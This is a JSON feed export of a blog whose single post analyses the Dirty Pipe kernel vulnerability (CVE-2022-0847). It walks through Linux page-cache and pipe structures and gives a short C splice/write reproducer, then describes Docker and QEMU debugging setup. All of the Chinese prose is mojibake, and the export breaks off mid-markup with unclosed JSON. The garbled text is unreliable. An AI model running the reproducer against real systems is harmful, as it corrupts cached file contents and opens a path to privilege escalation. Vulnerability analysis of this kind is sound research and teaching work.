{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog",
    "description": "introvert",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/",
            "url": "https://squirre17.github.io/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/",
            "title": "CVE-2022-0847-DIRTY-PIPE-detail",
            "date_published": "2022-11-02T14:19:00.000Z",
            "content_html": "<h1 id=\"basic\"><a class=\"markdownIt-Anchor\" href=\"#basic\">#</a> basic</h1>\n<p>(ä¹‹åä¼šæŠŠ docker åšå¥½ä¼ ä¸Šå» ä»¥åå°±ä¸ç”¨æŠ˜è…¾äº† QAQ)<br>\n<a href=\"https://hub.docker.com/repository/docker/squirre17/dirtypipe\">https://hub.docker.com/repository/docker/squirre17/dirtypipe</a></p>\n<h2 id=\"page-cache\"><a class=\"markdownIt-Anchor\" href=\"#page-cache\">#</a> page cache</h2>\n<p>Linux çš„æ¢é¡µæœºåˆ¶æ˜¯è„é¡µæœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯å†™ä¸€ä¸ªæ–‡ä»¶æ˜¯é€šè¿‡å†™å†…å­˜ç¼“å­˜é¡µï¼Œç„¶åæ ‡è®°è„ä½ï¼Œåœ¨æ¢é¡µçš„æ—¶å€™ä¸€æ¬¡æ€§å†™å›ç£ç›˜ã€‚è€Œä¸æ˜¯æ¯æ¬¡éƒ½å†™ç£ç›˜ã€‚<br>\nåœ¨æ‰“å¼€æ–‡ä»¶çš„æ—¶å€™å¯ä»¥ç”¨ <code>O_DIRECT | O_SYNC</code>  æ¥æ ‡è®°å¯¹è„é¡µè¿›è¡Œç›´å†™ç­–ç•¥ï¼Œæ¢å›åŒæ­¥ã€‚<br>\nä½†è¿™é‡Œå¹¶ä¸æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œç¡¬å­˜çº§åˆ«çš„ç¯¡æ”¹ï¼Œå‡è®¾æ–‡ä»¶è¿›äº†å†…å­˜ï¼Œç„¶åæˆ‘ä¿®æ”¹äº†è¿™ä¸ªæ–‡ä»¶å†…å­˜ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼ŒçŸ­æ—¶é—´å†æ¬¡è®¿é—®è¿™ä¸ªæ–‡ä»¶ä¼šç›´æ¥ä»å†…å­˜ç¼“å­˜ä¸­æ‹¿åˆ°æˆ‘ä»¬ç¯¡æ”¹è¿‡çš„å†…å®¹è€Œä¸æ˜¯å» disk ä¸Šå–ã€‚</p>\n<h2 id=\"structs\"><a class=\"markdownIt-Anchor\" href=\"#structs\">#</a> structs</h2>\n<h3 id=\"file\"><a class=\"markdownIt-Anchor\" href=\"#file\">#</a> file</h3>\n<p><a href=\"https://elixir.bootlin.com/linux/v5.13-rc1/source/include/linux/fs.h#L920\">fs.h - include/linux/fs.h - Linux source code (v5.13-rc1) - Bootlin</a><br>\n æ¯ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦å’Œä¸€ä¸ª struct ç›¸å¯¹åº”</p>\n<ul>\n<li>pipe_inode_info æŒ‡å‘ä¸€ä¸ªå†…æ ¸ç®¡é“</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file</span> &#123;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">path</span>                  <span class=\"title\">f_path</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span>                 *<span class=\"title\">f_inode</span>;</span></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file_operations</span> *<span class=\"title\">f_op</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span>         *<span class=\"title\">f_mapping</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">\t <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> Â  Â *<span class=\"title\">i_pipe</span>;</span></span><br><span class=\"line\">... </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>å…¶ä¸­çš„ address_space æŒ‡ç¤ºäº†è¿™ä¸ªæ–‡ä»¶å†…å®¹çš„æ˜ å°„ä½ç½®</p>\n<h3 id=\"address_space\"><a class=\"markdownIt-Anchor\" href=\"#address_space\">#</a> address_space</h3>\n<p>address_space çš„ä½œç”¨å°±æ˜¯å°†æ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„æ•°æ®ä¹Ÿ<strong> page</strong> çš„æ–¹å¼è¿ç»­åœ°å‘ˆç°å‡ºæ¥ï¼Œ è¿™æ ·è¯»å–æ–‡ä»¶çš„æ“ä½œä¾¿è½¬æ¢æˆäº†å…ˆå°†ä¸è¿ç»­çš„ç£ç›˜ä¸Šçš„å†…å®¹è¯»å–çš„ page ä¸­ï¼Œ å†ä»è¿ç»­çš„ page ä¸­å»è¯»å–è¿ç»­çš„æ•°æ®ã€‚</p>\n<ul>\n<li>i_pages: ç¼“å­˜é¡µç»„ (æ˜¯ä¸€ä¸ª eXtend ARRAY)</li>\n<li>nrpages: é¡µè¡¨å…¥å£çš„å¤§å°</li>\n<li>a_ops: è®°å½•ç€å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ“ä½œçš„è™šè¡¨æ–¹æ³• (glibc æ‰“ io æˆ–è€…å†…æ ¸æ‰“ ptmx ç±»ä¼¼)</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span>        *<span class=\"title\">host</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xarray</span>       <span class=\"title\">i_pages</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span>       nrpages;</span><br><span class=\"line\">    <span class=\"type\">pgoff_t</span>             writeback_index;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space_operations</span> *<span class=\"title\">a_ops</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span>       flags;</span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"xarray\"><a class=\"markdownIt-Anchor\" href=\"#xarray\">#</a> xarray</h3>\n<p>xarray æŒ‡å‘äº†å¤šä¸ª page ç»“æ„ä½“ ä¹Ÿå°±æ˜¯è¿™ä¸ªæ–‡ä»¶å­˜æ”¾åœ¨å“ªå‡ é¡µã€‚(è¿™é‡Œæ˜¯åº”è¯¥æ˜¯ä»¥__rcu ä¸ºé“¾è¡¨çš„å½¢å¼ å¾…éªŒè¯)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xarray</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span>\txa_lock;</span><br><span class=\"line\"><span class=\"comment\">/* private: The rest of the data structure is not to be used directly. */</span></span><br><span class=\"line\">\t<span class=\"type\">gfp_t</span>\t\txa_flags;</span><br><span class=\"line\">\t<span class=\"type\">void</span> __rcu *\txa_head;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"pipe_inode_info\"><a class=\"markdownIt-Anchor\" href=\"#pipe_inode_info\">#</a> pipe_inode_info</h3>\n<p>åœ¨ file é‡Œçš„å†…æ ¸ç®¡é“</p>\n<ul>\n<li>head æŒ‡å‘ç”Ÿäº§è€… buffer</li>\n<li>tail æŒ‡å‘æ¶ˆè´¹è€… buffer</li>\n<li>bufs å¾ªç¯ buffer çš„ä¸€ä¸ªé“¾è¡¨<br>\nè¿™é‡Œçš„ ring ä¼šè¢«è®¾ç½®ä¸º 16 ä¹Ÿå°±æ˜¯æœ‰ 16 ä¸ªå¾ªç¯ buf ä¾› pipe ä½¿ç”¨<br>\nç„¶å head å’Œ tail æ˜¯ç”¨äºåœ¨ bufs ä¸­åšç´¢å¼•çš„<br>\nä¾‹å¦‚ <code>&amp;pipe-&gt;bufs[(head - 1) &amp; mask];</code>  è¿™é‡Œçš„ mask å°±æ˜¯ ring-1.<br>\n å†…æ ¸ä¼šä¸ºä¸€ä¸ª pipe åˆ†é… 16 ä¸ª pipe_bufferï¼Œå¾ªç¯ç¼“å†²åŒº</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">mutex</span> <span class=\"title\">mutex</span>;</span></span><br><span class=\"line\">    <span class=\"type\">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> head;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> tail;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> max_usage;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> ring_size;</span><br><span class=\"line\"></span><br><span class=\"line\">\t (Â·Â·Â·)</span><br><span class=\"line\">\t </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">bufs</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">watch_queue</span> *<span class=\"title\">watch_queue</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/1.png\" alt><br>\nï¼ˆå›¾ç‰‡æ¥æº breeze ğŸ’ï¼‰</p>\n<h3 id=\"pipe_buffer\"><a class=\"markdownIt-Anchor\" href=\"#pipe_buffer\">#</a> pipe_buffer</h3>\n<p>æ¯ä¸€ä¸ª buffer æŒ‡å‘ä¸€ä¸ª page</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> offset, len;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buf_operations</span> *<span class=\"title\">ops</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> private;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>page ç»“æ„ä½“</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> flags;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"comment\">/* Page cache and anonymous pages */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span> *<span class=\"title\">mapping</span>;</span></span><br><span class=\"line\">    <span class=\"type\">pgoff_t</span> index;        <span class=\"comment\">/* Our offset within mapping. */</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"type\">void</span> *virtual;    <span class=\"comment\">/* Kernel virtual address (NULL if</span></span><br><span class=\"line\"><span class=\"comment\">                       not kmapped, ie. highmem) */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/2.png\" alt></p>\n<h3 id=\"inode\"><a class=\"markdownIt-Anchor\" href=\"#inode\">#</a> inode</h3>\n<p>åœ¨ file çš„ç»“æ„ä½“ä¸­å¯ä»¥çœ‹åˆ° æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½æœ‰ inode (è¿™æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„ç®¡ç†æ–¹å¼)ï¼Œå¯¹äºç®¡é“ï¼Œä¹Ÿæœ‰è‡ªå·±çš„ inode</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> inode * <span class=\"title function_\">get_pipe_inode</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span> *<span class=\"title\">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!inode)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> fail_inode;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_ino = get_next_ino();</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe = alloc_pipe_info();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pipe)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> fail_iput;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_pipe = pipe;            <span class=\"comment\">// inode æŒ‡å‘ä¸€ä¸ª pipe</span></span><br><span class=\"line\">\tpipe-&gt;files = <span class=\"number\">2</span>;                 <span class=\"comment\">// number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class=\"line\">\tpipe-&gt;readers = pipe-&gt;writers = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tinode-&gt;i_fop = &amp;pipefifo_fops;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_state = I_DIRTY;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å…³äº pipe çš„åˆ›å»º</p>\n<ul>\n<li>ç”³è¯·äº†ä¸€ä¸ª pipe_inode_info ç»“æ„ä½“</li>\n<li>ç”³è¯·äº†å¤šä¸ª bufï¼Œä½†æ˜¯åªè¿”å›ä¸€ä¸ªæŒ‡å‘è¿™å¤šä¸ª buf çš„å¤´æŒ‡é’ˆï¼Œç›¸å½“äºå¯¹ä¸€ä¸ªé•¿åº¦çš„æ•°ç»„åšå¤´ç»“ç‚¹å’Œå°¾ç»“ç‚¹éƒ½ç§»åŠ¨çš„é“¾è¡¨ (æ•°æ®ç»“æ„å­¦è¿‡çš„é˜Ÿåˆ—é‚£å—)</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> pipe_inode_info *<span class=\"title function_\">alloc_pipe_info</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span> =</span> get_current_user();</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> user_bufs;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe = kzalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe-&gt;bufs = kcalloc(pipe_bufs, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pipe_buffer),</span><br><span class=\"line\">\t\t\t     GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pipe-&gt;bufs) &#123;</span><br><span class=\"line\">\t\tinit_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class=\"line\">\t\tinit_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class=\"line\">\t\tpipe-&gt;r_counter = pipe-&gt;w_counter = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tpipe-&gt;max_usage = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;ring_size = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;nr_accounted = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;user = user;</span><br><span class=\"line\">\t\tmutex_init(&amp;pipe-&gt;mutex);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pipe;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"iov_iter\"><a class=\"markdownIt-Anchor\" href=\"#iov_iter\">#</a> iov_iter</h3>\n<p>iovec æ¥å£ç”¨äºå¤„ç†ç”¨æˆ·ä¼ å…¥çš„ç”¨æˆ·æ€ç¼“å­˜</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">iov_iter</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Bit 0 is the read/write bit, set if we&#x27;re writing.</span></span><br><span class=\"line\"><span class=\"comment\">\t * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span></span><br><span class=\"line\"><span class=\"comment\">\t * the caller isn&#x27;t expecting to drop a page reference when done.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> type;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> iov_offset;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> count;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span>&#123;</span></span><br><span class=\"line\">\t\t(Â·Â·Â·)</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>åœ¨è¿™é‡Œåªç”¨åˆ°äº†ä¸€ä¸ª pipe å¯¹è±¡ (ä¹Ÿå°±æ˜¯ pipe å¯¹è±¡ç”± iov_iter è¿›è¡Œç®¡ç†æˆ–è€…è¯´æ˜¯æ›´å¤–ä¸€å±‚çš„å°è£…)ã€‚<br>\nåœ¨ PoC ä¸­ç”± copy_page_to_iter_pipe å‡½æ•°å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ® (page) å†™å…¥ iov_iter ç®¡ç†çš„ pipe ä¸­</p>\n<h2 id=\"demo\"><a class=\"markdownIt-Anchor\" href=\"#demo\">#</a> demo</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;AAAAAAAAAA&quot; &gt; foo</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _GNU_SOURCE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">    splice(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, <span class=\"string\">&quot;BBBBB&quot;</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ./splicer &lt;foo |cat &gt;/dev/null</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"environment\"><a class=\"markdownIt-Anchor\" href=\"#environment\">#</a> environment</h1>\n<h2 id=\"docker\"><a class=\"markdownIt-Anchor\" href=\"#docker\">#</a> docker</h2>\n<p>æ‹‰ä¸‹ ubuntu20, æ¢ä¸ªæºå…ˆ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i &quot;s/http:\\/\\/archive.ubuntu.com/http:\\/\\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list</span><br><span class=\"line\">apt-get update &amp;&amp; apt-get -y dist-upgrade</span><br></pre></td></tr></table></figure>\n<p>å¯åŠ¨å†…æ ¸çš„æ—¶å€™åƒä¸‡è¦æ³¨æ„ï¼ï¼</p>\n<ul>\n<li>å¢åŠ  SYS_PTRACEï¼ˆæ‰“å¼€è°ƒè¯•ï¼‰</li>\n<li>å¢åŠ ç«¯å£æ˜ å°„ï¼ˆè¿™æ ·æ‰èƒ½è®©å¤–éƒ¨ä¸»æœºè¿ä¸Š gdbï¼‰</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --name=mdp1 --cap-add=SYS_PTRACE -p 1234:1234 my_dirty_pipe:1.0 /bin/bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"other-tools\"><a class=\"markdownIt-Anchor\" href=\"#other-tools\">#</a> other tools</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alias agi=&quot;/bin/apt-get install -y&quot;</span><br><span class=\"line\">agi vim gdb gdbserver wget make gcc flex bison bc git cpio ninja-build pkg-config automake libtool</span><br><span class=\"line\">agi libncurses-dev openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf libglib2.0-dev</span><br><span class=\"line\">agi libpixman-1-dev python</span><br></pre></td></tr></table></figure>\n<h2 id=\"qemu\"><a class=\"markdownIt-Anchor\" href=\"#qemu\">#</a> qemu</h2>\n<p>ä¸€ä¸ªæŠ¥é”™çš„è§£å†³æ–‡æ¡£ <a href=\"https://hackmd.io/@vqXkRUAvSzWmuGTirpUnMQ/rkVhfCa-r\">QEMU contribution - HackMD</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://download.qemu.org/qemu-6.2.0.tar.xz</span><br><span class=\"line\">mkdir build &amp;&amp; cd build  # åœ¨ä¸‹è½½ç›®å½•æ–°å»ºæ–‡ä»¶å¤¹buildï¼ˆè¿™æ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºconfigureå‘½ä»¤å¿…é¡»åœ¨buildæ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œï¼‰</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ä»¥ä¸‹å‡åœ¨/buildç›®å½•ä¸‹</span></span><br><span class=\"line\">../configure</span><br><span 